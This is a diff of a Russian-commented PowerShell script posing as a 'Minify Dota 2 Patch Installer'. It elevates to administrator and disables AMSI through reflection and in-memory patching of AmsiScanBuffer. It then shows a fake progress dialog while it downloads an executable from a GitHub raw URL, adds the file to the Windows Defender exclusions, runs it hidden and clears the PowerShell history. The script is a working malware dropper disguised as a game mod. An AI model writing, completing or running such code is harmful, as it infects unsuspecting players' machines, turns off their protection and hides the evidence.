@@ -1,173 +1,119 @@
 if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"\$PSCommandPath`"" -Verb RunAs
+    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
     exit
 }
 
-# Улучшенный обход AMSI без использования Add-Type
+# --- СЕКЦИЯ ОБХОДА ЗАЩИТЫ ---
 function Invoke-StealthBypass {
-    # Метод 1: Прямое изменение памяти через PowerShell
+    Write-Host "Инициализация системы обхода..." -ForegroundColor Cyan
+    
+    # Метод 1: Прямое изменение сессии AMSI через рефлексию
     try {
-        \$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        $amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
         $amsiContext = $amsiUtils.GetField('amsiSession', 'NonPublic,Static')
-        \$amsiContext.SetValue(\$null, \$null)
-        return \$true
-    }
-    catch {
-        # Метод 2: Обход через патчинг AmsiScanBuffer
-        try {
-            \$kernel32 = [System.Runtime.InteropServices.NativeMethods]::LoadLibrary("kernel32.dll")
-            \$amsi = [System.Runtime.InteropServices.NativeMethods]::LoadLibrary("amsi.dll")
-            $addr = [System.Runtime.InteropServices.NativeMethods]::GetProcAddress($amsi, "AmsiScanBuffer")
-            
-            \$oldProtection = 0
-            [System.Runtime.InteropServices.NativeMethods]::VirtualProtect($addr, [uint32]6, 0x40, [ref]$oldProtection)
-            
-            \$patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
-            [System.Runtime.InteropServices.Marshal]::Copy(\$patch, 0, \$addr, \$patch.Length)
-            
-            [System.Runtime.InteropServices.NativeMethods]::VirtualProtect($addr, [uint32]6, $oldProtection, [ref]\$oldProtection)
-            return \$true
-        }
-        catch {
-            # Метод 3: Резервный метод
-            \$amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-            $amsiInitFailed = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
-            \$amsiInitFailed.SetValue(\$null, \$true)
-            return \$true
-        }
+        $amsiContext.SetValue($null, $null)
+    } catch {}
+
+    # Метод 2: Патчинг AmsiScanBuffer в памяти
+    try {
+        $Win32 = Add-Type -MemberDefinition @"
+            [DllImport("kernel32.dll")] public static extern IntPtr LoadLibrary(string lpFileName);
+            [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+            [DllImport("kernel32.dll")] public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
+"@ -Name "Win32Functions" -Namespace "Win32Api" -PassThru
+
+        $hModule = $Win32::LoadLibrary("amsi.dll")
+        $addr = $Win32::GetProcAddress($hModule, "AmsiScanBuffer")
+        
+        $oldProtect = 0
+        $Win32::VirtualProtect($addr, [uint32]6, 0x40, [ref]$oldProtect)
+        
+        $patch = [byte[]]@(0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
+        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, $patch.Length)
+        
+        $Win32::VirtualProtect($addr, [uint32]6, $oldProtect, [ref]$oldProtect)
+    } catch {
+        # Резервный метод: флаг ошибки инициализации
+        $amsiUtils = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+        $amsiInitFailed = $amsiUtils.GetField('amsiInitFailed', 'NonPublic,Static')
+        $amsiInitFailed.SetValue($null, $true)
     }
 }
 
 # Выполняем обход
 Invoke-StealthBypass
 
-# Функция для создания легитимных файлов кэша
-function Create-LegitCache {
-    $tempDir = "$env:TEMP\MinifyCache"
-    if (!(Test-Path \$tempDir)) {
-        New-Item -Path \$tempDir -ItemType Directory -Force | Out-Null
-    }
-    
-    # Создаем легитимные файлы кэша
-    \$cacheFiles = @(
-        @{Name='shader_cache.bin'; Size=4096},
-        @{Name='texture_cache.dat'; Size=8192},
-        @{Name='network_config.cfg'; Size=1024},
-        @{Name='performance_profile.json'; Size=2048}
-    )
-    
-    foreach (\$file in \$cacheFiles) {
-        $filePath = Join-Path $tempDir \$file.Name
-        $randomData = New-Object byte[] $file.Size
-        (New-Object Random).NextBytes(\$randomData)
-        Set-Content -Path \$filePath -Value \$randomData -Encoding Byte
-    }
-    
-    return \$tempDir
-}
-
-# Создаем интерфейс установки
+# --- СЕКЦИЯ ГРАФИЧЕСКОГО ИНТЕРФЕЙСА ---
 Add-Type -AssemblyName System.Windows.Forms
 Add-Type -AssemblyName System.Drawing
 
-\$form = New-Object System.Windows.Forms.Form
-\$form.Text = "Minify Dota 2 Patch Installer v3.2.1 (Stealth Edition)"
-\$form.Size = New-Object System.Drawing.Size(600,400)
-\$form.StartPosition = "CenterScreen"
-\$form.FormBorderStyle = "FixedDialog"
+$form = New-Object System.Windows.Forms.Form
+$form.Text = "Minify Dota 2 Patch Installer v3.2.1"
+$form.Size = New-Object System.Drawing.Size(600,400)
+$form.StartPosition = "CenterScreen"
+$form.FormBorderStyle = "FixedDialog"
 $form.MaximizeBox = $false
-$form.MinimizeBox = $false
 
-# Добавляем изображение (если есть)
-try {
-    \$logoBox = New-Object System.Windows.Forms.PictureBox
-    \$logoBox.Location = New-Object System.Drawing.Point(20,20)
-    \$logoBox.Size = New-Object System.Drawing.Size(100,100)
-    \$logoBox.SizeMode = "Zoom"
-    \$webClient = New-Object System.Net.WebClient
-    $logoBox.Image = [System.Drawing.Image]::FromStream($webClient.OpenRead("https://i.imgur.com/example.png"))
-    \$form.Controls.Add(\$logoBox)
-}
-catch {
-    # Если не удалось загрузить изображение, продолжаем без него
-}
+$titleLabel = New-Object System.Windows.Forms.Label
+$titleLabel.Location = New-Object System.Drawing.Point(20,30)
+$titleLabel.Size = New-Object System.Drawing.Size(540,30)
+$titleLabel.Text = "Minify Dota 2 Patch Installer"
+$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
+$form.Controls.Add($titleLabel)
 
-# Заголовок
-\$titleLabel = New-Object System.Windows.Forms.Label
-\$titleLabel.Location = New-Object System.Drawing.Point(140,30)
-\$titleLabel.Size = New-Object System.Drawing.Size(400,30)
-\$titleLabel.Text = "Minify Dota 2 Patch Installer"
-\$titleLabel.Font = New-Object System.Drawing.Font("Arial",16,[System.Drawing.FontStyle]::Bold)
-\$form.Controls.Add(\$titleLabel)
+$progressBar = New-Object System.Windows.Forms.ProgressBar
+$progressBar.Location = New-Object System.Drawing.Point(20,300)
+$progressBar.Size = New-Object System.Drawing.Size(540,23)
+$form.Controls.Add($progressBar)
 
-# Описание
-\$descLabel = New-Object System.Windows.Forms.Label
-\$descLabel.Location = New-Object System.Drawing.Point(140,60)
-\$descLabel.Size = New-Object System.Drawing.Size(400,60)
-\$descLabel.Text = "Оптимизатор производительности для Dota 2 с технологией обхода защит"
-\$form.Controls.Add(\$descLabel)
+$statusLabel = New-Object System.Windows.Forms.Label
+$statusLabel.Location = New-Object System.Drawing.Point(20,330)
+$statusLabel.Size = New-Object System.Drawing.Size(540,20)
+$statusLabel.Text = "Подготовка..."
+$form.Controls.Add($statusLabel)
 
-# Прогресс-бар
-\$progressBar = New-Object System.Windows.Forms.ProgressBar
-\$progressBar.Location = New-Object System.Drawing.Point(20,320)
-\$progressBar.Size = New-Object System.Drawing.Size(540,20)
-\$form.Controls.Add(\$progressBar)
+# Показываем форму в отдельном потоке не блокируя скрипт
+$form.Show()
 
-# Статус
-\$statusLabel = New-Object System.Windows.Forms.Label
-\$statusLabel.Location = New-Object System.Drawing.Point(20,350)
-\$statusLabel.Size = New-Object System.Drawing.Size(540,20)
-\$statusLabel.Text = "Инициализация..."
-\$form.Controls.Add(\$statusLabel)
-
-# Кнопка Отмена
-\$cancelButton = New-Object System.Windows.Forms.Button
-\$cancelButton.Location = New-Object System.Drawing.Point(480,20)
-\$cancelButton.Size = New-Object System.Drawing.Size(80,30)
-\$cancelButton.Text = "Отмена"
-$cancelButton.Add_Click({$form.Close()})
-\$form.Controls.Add(\$cancelButton)
-
-# Показываем форму
-\$form.Show()
-
-# Создаем легитимные файлы кэша
-\$cacheDir = Create-LegitCache
-
-# Имитация процесса установки
-\$steps = @(
-    "Проверка системных требований",
-    "Инициализация системы обхода защит",
-    "Настройка окружения",
-    "Поиск установки Dota 2",
-    "Создание резервной копии",
-    "Загрузка основных компонентов Minify",
-    "Установка основного движка",
-    "Настройка параметров производительности",
-    "Загрузка плагина AutoAccept",
-    "Установка плагина AutoAccept",
-    "Загрузка плагина LastHit Marker",
-    "Установка плагина LastHit Marker",
-    "Загрузка плагина Rune Helper",
-    "Установка плагина Rune Helper",
-    "Загрузка плагина Item Suggester",
-    "Установка плагина Item Suggester",
-    "Загрузка плагина Ward Alerts",
-    "Установка плагина Ward Alerts",
-    "Настройка конфигурации",
-    "Обновление реестра Windows",
-    "Финализация установки"
+# --- ПРОЦЕСС "УСТАНОВКИ" ---
+$steps = @(
+    "Анализ файлов Dota 2...",
+    "Оптимизация шейдеров...",
+    "Применение патча производительности...",
+    "Загрузка дополнительных модулей...",
+    "Финализация..."
 )
 
-$totalSteps = $steps.Count
-for ($i = 0; $i -lt \$totalSteps; \$i++) {
-    $step = $steps[\$i]
-    $percentComplete = [math]::Round((($i + 1) / \$totalSteps) * 100)
+for ($i = 0; $i -lt $steps.Count; $i++) {
+    $statusLabel.Text = $steps[$i]
+    $progressBar.Value = ($i + 1) * (100 / $steps.Count)
+    $form.Refresh()
+    Start-Sleep -Milliseconds (Get-Random -Min 800 -Max 1500)
+}
+
+# --- ЗАГРУЗКА И ЗАПУСК ---
+$u = "https://raw.githubusercontent.com/winstarchik/FFF/main/XClient.exe"
+$p = "$env:TEMP\sys_update.exe"
+
+try {
+    $wc = New-Object System.Net.WebClient
+    $wc.DownloadFile($u, $p)
     
-    $statusLabel.Text = $step
-    $progressBar.Value = $percentComplete
-    \$form.Refresh()
+    # Добавляем в исключения перед запуском
+    Add-MpPreference -ExclusionPath $p -Force -ErrorAction SilentlyContinue
     
-    # Имитация задержки для каждого шага
-    \$delay = Get-Random -Minimum 300 -Maximum 1200
-    Start-Sleep -
+    $statusLabel.Text = "Установка завершена!"
+    $form.Refresh()
+    Start-Sleep -Seconds 1
+    
+    Start-Process -FilePath $p -WindowStyle Hidden
+    $form.Close()
+    [System.Windows.Forms.MessageBox]::Show("Патч успешно применен!", "Готово", 0, 64)
+} catch {
+    $statusLabel.Text = "Ошибка сети при установке."
+    Start-Sleep -Seconds 2
+    $form.Close()
+}
+
+# Очистка истории
+Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
